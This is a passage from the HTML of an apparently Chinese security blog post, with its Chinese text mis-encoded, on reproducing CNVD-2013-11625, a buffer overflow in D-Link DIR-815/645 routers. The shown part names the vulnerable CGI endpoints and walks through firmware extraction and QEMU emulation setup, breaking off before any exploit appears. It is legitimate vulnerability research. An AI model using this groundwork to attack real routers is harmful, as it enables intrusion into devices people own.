<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>CNVD-2013-11625å¤ç° | å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™</title><meta name="author" content="uf4te"><meta name="copyright" content="uf4te"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="è¿™æ˜¯ç¬¬ä¸€ç¯‡ CVE å¤ç°æ–‡ç« ï¼Œå…³äº DIR-815 ç­‰è·¯ç”±å™¨çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œéœ€è¦ç”¨åˆ° MIPS æ¶æ„çš„ ROPï¼Œæ”¶è·ä¸å°‘ï¼ŒåŒæ—¶ä¹Ÿè§£å†³äº† winmt å¤§ä½¬çš„ poc æ— æ³• getshell çš„é—®é¢˜ï¼Œå¾ˆé€‚åˆä½œä¸º CVE å¤ç°å…¥é—¨"><meta property="og:type" content="article"><meta property="og:title" content="CNVD-2013-11625å¤ç°"><meta property="og:url" content="https://www.uf4te.cn/posts/c2233a9.html"><meta property="og:site_name" content="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™"><meta property="og:description" content="è¿™æ˜¯ç¬¬ä¸€ç¯‡ CVE å¤ç°æ–‡ç« ï¼Œå…³äº DIR-815 ç­‰è·¯ç”±å™¨çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œéœ€è¦ç”¨åˆ° MIPS æ¶æ„çš„ ROPï¼Œæ”¶è·ä¸å°‘ï¼ŒåŒæ—¶ä¹Ÿè§£å†³äº† winmt å¤§ä½¬çš„ poc æ— æ³• getshell çš„é—®é¢˜ï¼Œå¾ˆé€‚åˆä½œä¸º CVE å¤ç°å…¥é—¨"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.uf4te.cn/img/cover/cover-131.jpg"><meta property="article:published_time" content="2024-06-12T13:03:01.000Z"><meta property="article:modified_time" content="2024-06-22T11:00:56.000Z"><meta property="article:author" content="uf4te"><meta property="article:tag" content="CVE"><meta property="article:tag" content="IOT"><meta property="article:tag" content="QEMU"><meta property="article:tag" content="GDB"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.uf4te.cn/img/cover/cover-131.jpg"><link rel="shortcut icon" href="/img/blog/avatar.jpg"><link rel="canonical" href="https://www.uf4te.cn/posts/c2233a9.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//sdk.51.la"><meta name="baidu-site-verification" content="codeva-b3iLZWQECM"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>!function(t){"use strict";!function(e){var r=window,s=document,n=t,c="".concat("https:"===s.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),i=s.createElement("script"),o=s.getElementsByTagName("script")[0];i.type="text/javascript",i.setAttribute("charset","UTF-8"),i.async=!0,i.src=c,i.id="LA_COLLECT",n.d=i;var a=function(){r.LA.ids.push(n)};r.LA?r.LA.ids&&a():(r.LA=t,r.LA.ids=[],a()),o.parentNode.insertBefore(i,o)}()}({id:"3GoBenqrrrBby5er",ck:"3GoBenqrrrBby5er",hashMode:!0})</script><script>!function(e,t,n,r){var i=t.createElement("script"),o=t.getElementsByTagName("script")[0];i.type="text/javascript",i.crossorigin=!0,i.onload=function(){(new e.LingQue.Monitor).init({id:"3GoBenqrrrBby5er"})},o.parentNode.insertBefore(i,o),i.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script>const GLOBAL_CONFIG={root:"/",algolia:{appId:"XY1UOYTY6S",apiKey:"4f03dfbbbff745c98fa4728e2ca61a96",indexName:"uf4te",hits:{per_page:10},languages:{input_placeholder:"æœç´¢æ–‡ç« ",hits_empty:"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}",hits_stats:"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"ç¹",msgToSimplifiedChinese:"ç®€"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"å¤åˆ¶æˆåŠŸ",error:"å¤åˆ¶é”™è¯¯",noSupport:"æµè§ˆå™¨ä¸æ”¯æŒ"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"åˆšåˆš",min:"åˆ†é’Ÿå‰",hour:"å°æ—¶å‰",day:"å¤©å‰",month:"ä¸ªæœˆå‰"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“",cht_to_chs:"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“",day_to_night:"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼",night_to_day:"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼",bgLight:"#323232",bgDark:"#696969",position:"bottom-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!1,rightside:!0}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"CNVD-2013-11625å¤ç°",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-06-22 19:00:56"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.getCSS=(e,t=!1)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},document.head.appendChild(a)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="/css/custom.css"><span id="fps"></span><script src="/js/reward.js"></script><script src="https://cdn1.tianli0.top/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><script>var fdataUser={apiurl:"https://friends.uf4te.cn/",defaultFish:500,hungryFish:500}</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload='this.media="screen"'><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™" type="application/atom+xml"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='onerror=null,src="/img/404/loading_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>æ–‡åº“</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>æ–‡ç« å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ–‡ç« æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>æ–‡ç« åˆ†ç±»</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>éšä¾¿é€›é€›</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>è§†é¢‘</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>å›¾ç‰‡</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>äº’åŠ¨</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>æˆ‘çš„è¯´è¯´</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>å‹é“¾æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>æ¨è</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>å®ç”¨å·¥å…·</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>æ—¶ç©ºä¹‹æµ·</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>æˆ‘çš„è£…å¤‡</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>å…³äºæœ¬ç«™</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url('/img/blog/default_top_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg"></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>æ–‡åº“</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>æ–‡ç« å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ–‡ç« æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>æ–‡ç« åˆ†ç±»</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>éšä¾¿é€›é€›</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>è§†é¢‘</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>å›¾ç‰‡</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>äº’åŠ¨</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>æˆ‘çš„è¯´è¯´</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>å‹é“¾æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>æ¨è</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>å®ç”¨å·¥å…·</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>æ—¶ç©ºä¹‹æµ·</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>æˆ‘çš„è£…å¤‡</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>å…³äºæœ¬ç«™</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CNVD-2013-11625å¤ç°</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-sharp fa-regular fa-pen-to-square fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2024-06-12T13:03:01.000Z 2024-06-12 21:03:01">2024-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-06-22T11:00:56.000Z 2024-06-22 19:00:56">2024-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-folder-open fa-fw post-meta-icon"></i> <a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVEå¤ç°</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span> <span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span> <span>31åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span data-flag-title="CNVD-2013-11625å¤ç°"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span class="waline-pageview-count" data-path="/posts/c2233a9.html"><i class="fa-solid fa-spinner fa-spin"></i></span></span> <span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">è¯„è®ºæ•°:</span><a href="/posts/c2233a9.html#post-comment"><span class="waline-comment-count" data-path="/posts/c2233a9.html"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s58 18 88 18 58-18 88-18 58 18 88 18v44h-352Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CNVD-2013-11625"><a href="#CNVD-2013-11625" class="headerlink" title="CNVD-2013-11625"></a>CNVD-2013-11625</h1><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">[åŸåˆ›] ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></li><li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1899323.html#google_vignette">D-Linkè·¯ç”±å™¨CNVD-2013-11625ç¼“å†²åŒºæº¢å‡ºæ¼æ´å¤ç° | CN-SEC ä¸­æ–‡ç½‘</a></li></ol></blockquote><h2 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h2><blockquote><p>D-Link DIR-645 <code>&quot;post_login.xml&quot;</code>ï¼Œ<code>&quot;hedwig.cgi&quot;</code>ï¼Œ<code>&quot;authentication.cgi&quot;</code> ä¸æ­£ç¡®è¿‡æ»¤ç”¨æˆ·æäº¤çš„å‚æ•°æ•°æ®ï¼Œå…è®¸è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ¼æ´æäº¤ç‰¹åˆ¶è¯·æ±‚è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä½¿åº”ç”¨ç¨‹åºåœæ­¢å“åº”ï¼Œé€ æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p></blockquote><p>2013 å¹´ï¼ŒD-Link DIR-645 æ— çº¿è·¯ç”±å™¨è¢«çˆ†å‡ºå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘è¯¥æ— çº¿è·¯ç”±å™¨çš„ <code>&quot;post_login.xml&quot;</code>ã€<code>&quot;hedwig.cgi&quot;</code>ã€<code>&quot;authentication.cgi&quot;</code> ç­‰æ¥å£æäº¤ç‰¹åˆ¶è¯·æ±‚å³å¯è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä½¿åº”ç”¨ç¨‹åºåœæ­¢å“åº”ï¼Œé€ æˆæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œæ¼æ´ç¼–å·ä¸º CNVD-2013-11625</p><p>åç»å®‰å…¨ç ”ç©¶å‘˜åˆ†æå‘ç°ï¼Œè¯¥æ¼æ´åŒæ—¶å½±å“ D-LINK çš„ DIR-815&#x2F;300&#x2F;600&#x2F;645 å‹å·è·¯ç”±å™¨è®¾å¤‡</p><p>æ¼æ´è¯¦æƒ…ï¼š<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">CNVD-2013-11625 | å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°</a></p><hr><h2 id="å¤ç°å·¥å…·"><a href="#å¤ç°å·¥å…·" class="headerlink" title="å¤ç°å·¥å…·"></a>å¤ç°å·¥å…·</h2><table><thead><tr><th align="left">åç§°</th><th align="left">ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="left">OSï¼ˆå®¿ä¸»æœºï¼‰</td><td align="left">Kali Linux 2024.1</td></tr><tr><td align="left">QEMU</td><td align="left">8.2.1</td></tr><tr><td align="left">binwalk</td><td align="left">2.3.3</td></tr><tr><td align="left">GDB &amp; gdbserver</td><td align="left">13.2</td></tr></tbody></table><hr><h2 id="å¤ç°æ¼æ´"><a href="#å¤ç°æ¼æ´" class="headerlink" title="å¤ç°æ¼æ´"></a>å¤ç°æ¼æ´</h2><h3 id="QEMU-ç³»ç»Ÿçº§å¤ç°"><a href="#QEMU-ç³»ç»Ÿçº§å¤ç°" class="headerlink" title="QEMU ç³»ç»Ÿçº§å¤ç°"></a>QEMU ç³»ç»Ÿçº§å¤ç°</h3><blockquote><p><strong>QEMU ç³»ç»Ÿçº§å±‚é¢çš„æ¼æ´å¤ç°éœ€è¦æˆ‘ä»¬é€šè¿‡ QEMU è™šæ‹Ÿæœºä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿ</strong></p></blockquote><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><blockquote><p>æ³¨æ„ï¼š</p><p><strong>å¯¹äºå›ºä»¶å¤„ç†å’Œä»¿çœŸçš„ç›¸å…³æ“ä½œï¼Œè¿™æ˜¯æœ¬æ–‡çš„å‰ç½®åŸºç¡€</strong></p><p>å¦‚æœå¯¹æœ¬æ–‡æœ‰ä»»ä½•ç–‘é—®è¯·å…ˆå‚è€ƒæœ¬ç«™çš„ã€Š<a href="3fd254db.html">IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ</a>ã€‹å’Œã€Š<a href="f0cbf9ee.html">IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•</a>ã€‹è¿™ä¸¤ç¯‡æ–‡ç« </p></blockquote><p>ä¸‹è½½å—å½±å“çš„å›ºä»¶ç‰ˆæœ¬ï¼Œè¿™é‡Œä»¥ D-LINK DIR-815 è·¯ç”±å™¨ä¸ºä¾‹ï¼š<a target="_blank" rel="noopener" href="https://pmdap.dlink.com.tw/PMD/GetAgileFile?itemNumber=FIR1000487&fileName=DIR-815A1_FW101SSB03.bin&fileSize=3784844.0">DIR-815A1_FW101SSB03.bin</a></p><p>é¦–å…ˆä½¿ç”¨ <code>binwalk -Me</code> åˆ†ç¦»å‡ºæ–‡ä»¶ç³»ç»Ÿï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> ./DIR-815A1_FW101SSB03.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼š</p><p>éœ€è¦æå‰å®‰è£… <code>binwalk</code> çš„ <code>sasquatch</code> å·¥å…·ï¼Œå¦åˆ™æå–å‡ºçš„ <code>squashfs-root</code> æ–‡ä»¶å¤¹æ˜¯ç©ºçš„</p><p>å…³äº <code>sasquatch</code> çš„å®‰è£…ä»¥åŠç›¸å…³æŠ¥é”™çš„å¤„ç†ï¼Œè§æœ¬ç«™ã€Š<a href="3fd254db.html">IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ</a>ã€‹ä¸€æ–‡</p></blockquote><p>æå–å‡ºè·¯ç”±å™¨çš„æ–‡ä»¶ç³»ç»Ÿï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B01.png" alt="CNVD-2013-11625å¤ç°1.png"></p><p>é€šè¿‡ <code>busybox</code> ç¨‹åºæŸ¥çœ‹è·¯ç”±å™¨æ¶æ„ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B02.png" alt="CNVD-2013-11625å¤ç°2.png"></p><p>é¦–å…ˆä¸‹è½½ MIPS32 æ¶æ„çš„ QEMU å†…æ ¸å’Œé•œåƒæ–‡ä»¶ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B03.png" alt="CNVD-2013-11625å¤ç°3.png"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ <code>wget</code> ä¸‹è½½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2 https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼š</p><p>MIPS32 æ¶æ„æœ‰ Debian Squeeze å’Œ Debian Wheezy ä¸¤ç§é•œåƒï¼š</p><ul><li>Squeeze ä¸­çš„è½¯ä»¶åŒ…å’Œåº“é€šå¸¸æ¯” Wheezy ä¸­çš„æ—§ï¼Œå› æ­¤ Squeeze é€‚åˆè¿è¡Œéœ€è¦ç‰¹å®šæ—§ç‰ˆæœ¬åº“æˆ–ä¾èµ–çš„åº”ç”¨ç¨‹åº</li><li>Wheezy é€‚åˆéœ€è¦æ›´å¥½çš„æ€§èƒ½ã€æ›´å¥½çš„ç¡¬ä»¶æ”¯æŒæˆ–æ›´æ–°çš„è½¯ä»¶åŒ…çš„åœºæ™¯</li></ul><p>å†…æ ¸é•œåƒæ–‡ä»¶ <code>vmlinux</code> æœ‰ <code>4kc</code> å’Œ <code>5kc</code> ä¸¤ç§ç‰ˆæœ¬ï¼š<strong>4kc ä¸º 32 ä½ï¼Œ5kc ä¸º 64 ä½</strong></p><p>å¦å¤–ï¼Œä¸ ARM æ¶æ„ä¸åŒï¼ŒMIPS32 çš„ä»¿çœŸæ²¡æœ‰ RAM ç£ç›˜æ˜ åƒæ–‡ä»¶ <code>initrd.img</code></p></blockquote><p>ä½¿ç”¨ <code>qemu-system-mipsel</code> æ¥å¯åŠ¨ QEMU è™šæ‹Ÿæœºï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-system-mipsel <span class="token punctuation">\</span>
  <span class="token parameter variable">-M</span> malta <span class="token punctuation">\</span>
  <span class="token parameter variable">-kernel</span> ./vmlinux-3.2.0-4-4kc-malta <span class="token punctuation">\</span>
  <span class="token parameter variable">-hda</span> ./debian_squeeze_mipsel_standard.qcow2 <span class="token punctuation">\</span>
  <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/sda1 console=tty0"</span> <span class="token punctuation">\</span>
  <span class="token parameter variable">-net</span> nic <span class="token punctuation">\</span>
  <span class="token parameter variable">-net</span> tap,ifname<span class="token operator">=</span>tap0,script<span class="token operator">=</span>no,downscript<span class="token operator">=</span>no <span class="token punctuation">\</span>
